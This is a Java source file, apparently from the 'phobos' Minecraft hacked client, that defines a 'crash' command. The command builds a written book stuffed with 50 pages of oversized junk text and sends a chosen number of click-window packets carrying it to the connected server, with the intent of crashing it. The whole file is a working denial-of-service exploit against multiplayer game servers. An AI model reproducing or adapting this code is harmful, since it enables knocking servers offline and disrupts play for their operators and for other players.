package me.earth.phobos.features.command.commands;

import me.earth.phobos.features.command.Command;
import me.earth.phobos.util.Util;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;

public class CrashCommand extends Command {
   int packets;

   public CrashCommand() {
      super("crash", new String[]{"crash"});
   }

   public void execute(final String[] commands) {
      (new Thread("crash time trololol") {
         public void run() {
            if (Minecraft.func_71410_x().func_147104_D() != null && !Minecraft.func_71410_x().func_147104_D().field_78845_b.isEmpty()) {
               if (commands[0] == null) {
                  Command.sendMessage("Put the number of packets to send as an argument to this command. (20 should be good)");
               } else {
                  try {
                     CrashCommand.this.packets = Integer.parseInt(commands[0]);
                  } catch (NumberFormatException var9) {
                     Command.sendMessage("Are you sure you put a number?");
                     return;
                  }

                  ItemStack bookObj = new ItemStack(Items.field_151099_bA);
                  NBTTagList list = new NBTTagList();
                  NBTTagCompound tag = new NBTTagCompound();
                  int pages = Math.min(50, 100);
                  String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";

                  int i;
                  for(i = 0; i < pages; ++i) {
                     NBTTagString tString = new NBTTagString(size);
                     list.func_74742_a(tString);
                  }

                  tag.func_74778_a("author", Util.mc.field_71439_g.func_70005_c_());
                  tag.func_74778_a("title", "phobos > all :^D");
                  tag.func_74782_a("pages", list);
                  bookObj.func_77983_a("pages", list);
                  bookObj.func_77982_d(tag);

                  for(i = 0; i < CrashCommand.this.packets; ++i) {
                     Util.mc.field_71442_b.field_78774_b.func_147297_a(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
                  }

               }
            } else {
               Command.sendMessage("Join a server monkey");
            }
         }
      }).start();
   }
}
